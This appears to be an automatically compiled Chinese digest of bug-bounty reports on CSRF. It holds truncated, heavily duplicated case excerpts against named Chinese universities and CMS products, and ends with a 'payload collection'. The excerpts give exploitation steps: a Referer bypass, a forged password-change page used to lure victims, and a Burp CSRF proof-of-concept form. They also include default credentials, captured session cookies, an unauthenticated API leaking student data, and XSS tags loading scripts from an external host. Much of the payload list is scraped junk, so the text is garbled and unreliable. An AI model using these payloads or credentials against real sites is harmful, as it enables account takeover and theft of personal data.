# SRC 实战报告提炼 — csrf

> 来源：蚂蚁SRC榜一Clown的 39 份实战报告
> 提取时间：2026-09-14

## 典型案例摘要（20 份）

### csrf绕过

收藏店铺 1.随便点个店铺点收藏 2.抓包 3.绕过发现这个包是要检测referer的,但是可以用登陆业务来绕过 4.先url编码https%3a%2f%2xxxx%2fjsonp%2fcollectShop%2f1%3fcallback%3djQuery2110455627700315805_1573264921361%26shopId%3d1172u3gc%26_%3d1573264921363 5.添加到https://xxxx.com/user/newlogin?redirect_url=后面形成payload : https://xxxx/user/newlogin?redirect

### 基础漏洞csrf挖掘 (1)

基础漏洞csrf挖掘 0x01:漏洞原理： 当我们可以使目标对象浏览器发送HTTP请求到别的Web 网站时,就会发生跨站请求伪造（CSRF)攻击。该Web网站会执行一些操作,使得请求看起来是有效的,并且发自目标对象。这种攻击一般依赖于目标对象之前已经通过了具有漏洞的网站的身份认证,并且攻击者向该网站发起的提交动作和网站的响应不被目标对象感知。当CSRF攻击成功时,我们就可以修改服务器端信息并很有可能完全接管用户的账号。 下面用一个列子来讲解： 李华登录他的网银并查看余额。 李华查看完余额后,登录不同域下的邮箱账号并查收邮件。 李华看到了一封具有连接到不熟悉网站的链接的邮件，并打开了这个链接以查

### 江西九江科技中等专业学校存在逻辑缺陷

漏洞地址:https://jjkj.ynedut.com/ynedut/login.htm 漏洞描述: 成都依能科技股份有限公司 yn智慧校园 存在逻辑缺陷，接口未鉴权导致可查询全部师生 手机号、身份证、姓名、工号、密码、等级、token 账密: 3041/jjkjzz111(默认密码) 3189/jjkjzz111(默认密码） a. https://src.sjtu.edu.cn/post/172628/ 第1页 共3页 b. 点击搜索会请求接口 /smesis/personnelInfoMaintenance/findRSGLSysUserByPlatformSysOrganization

### 上海交通大学

这是登录后的样子，然后使用浏览器刷新界面，使用bp 抓包： 看到这个数据包的时候修改返回包 GET/api/v1/sessionsHTTP/1.1 Host:chuntsung.sjtu.edu.cn Cookie: _ym_d=1641734885; _ym_uid=1641734885683102777; UM_distinctid=17fc4f16a12d19-0bdd3ee12f2304-9771a3f-fa000-17fc4f16a13dd3; SJTU-HEALTH=u5pcjqfdpe4urb8lkulqistsm5; _ga_FWJYL8QN0J=GS1.1.164829100

### 漏洞挖掘之某厂商OAuth2.0认证缺陷CSRF-第三方帐号快捷登录授权劫持漏洞

漏洞挖掘之某厂商OAuth2.0认证缺陷CSRF-第三方帐号快捷登录 授权劫持漏洞 0x00 前言 文章中的项目地址统一修改为: a.test.com 保护厂商也保护自己 0x01 OAuth2.0 经常出现的地方 1：网站登录处  2：社交帐号绑定处 0x02 某厂商绑定微博请求包 0x02.1 请求包1： GET https://www.a.test.com/users/auth/weibo?can_transfer=true HTTP/1.1 Host: www.a.test.com Request: HTTP/1.1 302 Found Server: Tengine Content-

### 基础漏洞csrf挖掘

基础漏洞csrf挖掘 0x01:漏洞原理： 当我们可以使目标对象浏览器发送HTTP请求到别的Web 网站时,就会发生跨站请求伪造（CSRF)攻击。该Web网站会执行一些操作,使得请求看起来是有效的,并且发自目标对象。这种攻击一般依赖于目标对象之前已经通过了具有漏洞的网站的身份认证,并且攻击者向该网站发起的提交动作和网站的响应不被目标对象感知。当CSRF攻击成功时,我们就可以修改服务器端信息并很有可能完全接管用户的账号。 下面用一个列子来讲解： 李华登录他的网银并查看余额。 李华查看完余额后,登录不同域下的邮箱账号并查收邮件。 李华看到了一封具有连接到不熟悉网站的链接的邮件，并打开了这个链接以查

### 同济大学2

/ 同济大学 时间 单位 作者 等级 Rank 2022-05-21 16:51:52 同济大学  (/list/firm/3760) fengx1a0 (/profile/12658/) 低危 0 无描述 ... 同济大学存在 csrf 漏洞可以对密码进行恶意修改  http://study-info.tongji.edu.cn/  这里测试账号为 <EMAIL-REDACTED>  密码 qweasd123  （ 1 ）登录后修改密码设定一个新密码然后抓包  （ 2 ）发送到 burp 自带的 csrf 的工具  （ 3 ）然后复制放到公网形成 html 文件，诱导用户点击就可以恶意修改

### 上海交通大学-存在逻辑缺陷-2

这是登录后的样子，然后使用浏览器刷新界面，使用 bp 抓包：  看到这个数据包的时候修改返回包  GET /api/v1/sessions HTTP/1.1  Host: chuntsung.sjtu.edu.cn  Cookie: _ym_d=1641734885; _ym_uid=1641734885683102777;  UM_distinctid=17fc4f16a12d19-0bdd3ee12f2304-9771a3f-fa000-17fc4f16 a13dd3;  SJTU-HEALTH=u5pcjqfdpe4urb8lkulqistsm5;   _ga_FWJYL8QN0J=GS

### 同济大学2 (1)

/ 同济大学 时间 单位 作者 等级 Rank 2022-05-21 16:51:52 同济大学 (/list/firm/3760) fengx1a0 (/profile/12658/) 低危 0 无描述... 同济大学存在csrf漏洞可以对密码进行恶意修改  http://study-info.tongji.edu.cn/  这里测试账号为<EMAIL-REDACTED>  密码qweasd123  （1）登录后修改密码设定一个新密码然后抓包  （2）发送到burp自带的csrf的工具  （3）然后复制放到公网形成html文件，诱导用户点击就可以恶意修改密码 fcmit.cc / fcmi

### 上海交通大学 (1)

这是登录后的样子，然后使用浏览器刷新界面，使用 bp 抓包： 看到这个数据包的时候修改返回包 GET/api/v1/sessionsHTTP/1.1 Host:chuntsung.sjtu.edu.cn Cookie: _ym_d=1641734885; _ym_uid=1641734885683102777 ; UM_distinctid=17fc4f16a12d19-0bdd3ee12f2304-9771a3f-fa000-17fc4f16a13dd3; SJTU-HEALTH=u5pcjqfdpe4urb8lkulqistsm5; _ga_FWJYL8QN0J=GS1.1.1648291

### 江西九江科技中等专业学校存在逻辑缺陷

漏洞地址:https://jjkj.ynedut.com/ynedut/login.htm 漏洞描述: 成都依能科技股份有限公司 yn智慧校园 存在逻辑缺陷，接口未鉴权导致可查询全部师生 手机号、身份证、姓名、工号、密码、等级、token 账密: 3041/jjkjzz111(默认密码) 3189/jjkjzz111(默认密码） a. https://src.sjtu.edu.cn/post/172628/ 第1页 共3页 b. 点击搜索会请求接口 /smesis/personnelInfoMaintenance/findRSGLSysUserByPlatformSysOrganization

### 上海交通大学

这是登录后的样子，然后使用浏览器刷新界面，使用bp 抓包： 看到这个数据包的时候修改返回包 GET/api/v1/sessionsHTTP/1.1 Host:chuntsung.sjtu.edu.cn Cookie: _ym_d=1641734885; _ym_uid=1641734885683102777; UM_distinctid=17fc4f16a12d19-0bdd3ee12f2304-9771a3f-fa000-17fc4f16a13dd3; SJTU-HEALTH=u5pcjqfdpe4urb8lkulqistsm5; _ga_FWJYL8QN0J=GS1.1.164829100

### 漏洞挖掘之某厂商OAuth2.0认证缺陷CSRF-第三方帐号快捷登录授权劫持漏洞

漏洞挖掘之某厂商OAuth2.0认证缺陷CSRF-第三方帐号快捷登录 授权劫持漏洞 0x00 前言 文章中的项目地址统一修改为: a.test.com 保护厂商也保护自己 0x01 OAuth2.0 经常出现的地方 1：网站登录处  2：社交帐号绑定处 0x02 某厂商绑定微博请求包 0x02.1 请求包1： GET https://www.a.test.com/users/auth/weibo?can_transfer=true HTTP/1.1 Host: www.a.test.com Request: HTTP/1.1 302 Found Server: Tengine Content-

### 基础漏洞csrf挖掘

基础漏洞csrf挖掘 0x01:漏洞原理： 当我们可以使目标对象浏览器发送HTTP请求到别的Web 网站时,就会发生跨站请求伪造（CSRF)攻击。该Web网站会执行一些操作,使得请求看起来是有效的,并且发自目标对象。这种攻击一般依赖于目标对象之前已经通过了具有漏洞的网站的身份认证,并且攻击者向该网站发起的提交动作和网站的响应不被目标对象感知。当CSRF攻击成功时,我们就可以修改服务器端信息并很有可能完全接管用户的账号。 下面用一个列子来讲解： 李华登录他的网银并查看余额。 李华查看完余额后,登录不同域下的邮箱账号并查收邮件。 李华看到了一封具有连接到不熟悉网站的链接的邮件，并打开了这个链接以查

### 同济大学2

/ 同济大学 时间 单位 作者 等级 Rank 2022-05-21 16:51:52 同济大学  (/list/firm/3760) fengx1a0 (/profile/12658/) 低危 0 无描述 ... 同济大学存在 csrf 漏洞可以对密码进行恶意修改  http://study-info.tongji.edu.cn/  这里测试账号为 <EMAIL-REDACTED>  密码 qweasd123  （ 1 ）登录后修改密码设定一个新密码然后抓包  （ 2 ）发送到 burp 自带的 csrf 的工具  （ 3 ）然后复制放到公网形成 html 文件，诱导用户点击就可以恶意修改

### 基础漏洞csrf挖掘

基础漏洞 csrf 挖掘  0x01:漏洞原理：  当我们可以使目标对象浏览器发送 HTTP 请求到别的 Web 网站时,就会发生跨站请求伪 造（CSRF)攻击。 该Web 网站会执行一些操作,使得请求看起来是有效的,并且发自目标对象。 这种攻击一般依赖于目标对象之前已经通过了具有漏洞的网站的身份认证 ,并且攻击者向该 网站发起的提交动作和网站的响应不被目标对象感知。当 CSRF 攻击成功时,我们就可以修改 服务器端信息并很有可能完全接管用户的账号。  下面用一个列子来讲解：  李华登录他的网银并查看余额。  李华查看完余额后,登录不同域下的邮箱账号并查收邮件。  李华看到了一封具有连接到不熟

### 同济大学2 (1)

/ 同济大学 时间 单位 作者 等级 Rank 2022-05-21 16:51:52 同济大学 (/list/firm/3760) fengx1a0 (/profile/12658/) 低危 0 无描述... 同济大学存在csrf漏洞可以对密码进行恶意修改  http://study-info.tongji.edu.cn/  这里测试账号为<EMAIL-REDACTED>  密码qweasd123  （1）登录后修改密码设定一个新密码然后抓包  （2）发送到burp自带的csrf的工具  （3）然后复制放到公网形成html文件，诱导用户点击就可以恶意修改密码 fcmit.cc / fcmi

### XDCMS 1.0 csrf漏洞

XDCMS 1.0 csrf 漏洞  一、漏洞简介  二、漏洞影响  XDCMS 1.0  三、复现过程  CSRF 漏洞常存在于涉及权限控制的地方，像管理后台、会员中心、论坛 帖子、资料修改、交易管理等。   通常可检查相应代码处是否存在检测 token 或 referer，如果没有 token/referer 直接请求该页面进行判断   漏洞存在于用户资料修改页面， URL：index.php?m=member&f=edit，同 SQL 注入 2 漏洞点相同  直接修改 Cookie 中 member_userid 字段，成功将其他用户信息修改     fcmit.cc

### PbootCMS csrf

PbootCMS csrf  一、漏洞简介  二、漏洞影响  三、复现过程  我将网站建立在本地，本来想测试添加用户的操作，但是发现这里有 formcheck 验证，所以失败了    然后我想到了删除用户位置，首先我使用管理员账号登陆，在删除用户的操作时抓 包。发现很简单。只有一个 id 来判断删除哪个用户    于是我直接构造一个新的 url， http://127.0.0.1/cve/p/admin.php/User/del/ucode/1000 4（上面是 10003）  确认这个用户是存在的。然后访问 http://127.0.0.1/cve/p/admin.php/User/del/

### CatfishCMS后台csrf

CatfishCMS 后台 csrf  一、漏洞简介  二、漏洞影响  三、复现过程  首先需要登录后台  <html>    <!-- CSRF PoC - generated by Burp Suite Professional -->    <body>    <script>history.pushState(’’, ’’, ’/’)</script>    <form action="http://0-sec.org/index.php/admin/index/modifymanage.htm l?c=73" method="POST">        <input type="hi

## 实战 Payload 集（31 条去重）

### XSS

```
<script> document.forms[0].submit(); </script>
<ScRipT sRc=http://xxxxx.cn/ExiptZI></SCriPt>
<ScRipT sRc=http://xxxxx.cn/Exi0TCW></SCriPt>
<script>history.pushState(’’, ’’, ’/’)</script>
<script>history.pushState('', '', '/')</script>
onload="exec1();">
javascript://
ontent="text/html;
ontent="哔哩哔哩安全应急响应中心">
ontent="bilibili,哔哩哔哩,BILISRC,安全应急响应中心">
ontent="width=device-width,
<script type="text/javascript" src="./直播删除通知dos_files/jquery.3.5.1.min.js.下载"></script>
<script type="text/javascript" src="./直播删除通知dos_files/common.js.下载"></script>
<script src="./直播删除通知dos_files/bootstrap.min.js.下载"></script>
ontainer="body"
```

### curl

```
curl = curl_init();
```

### URL

```
http://127.0.0.1/cve/p/admin.php/User/del/ucode/1000
http://0-sec.org/index.php/admin/index/modifymanage.htm
http://www.0-sec.org/seacms/backend/admin_video.php?a
http://url/index.php/admin/index/modifymanage.html?c=73"
http://127.0.0.1/EyouCMS1.4.3/login.php?m=admin&c=Ad
http://url/cve/p/admin.php/User/del/ucode/10004`（上面是10003）
http://url/cve/p/admin.php/User/del/ucode/10004`
http://url/cve/p/admin.php/User/del/ucode/10004`触发漏洞
http://0-sec.org:8080/admin/adminadd.php?action=add"
http://www.0-sec.org/admin.php?c=member&m=edit&uid=1"
```

## 技术手法统计

- 漏洞利用: 10 次
- WAF/过滤绕过: 1 次
- 漏洞链: 1 次
- 提权: 1 次

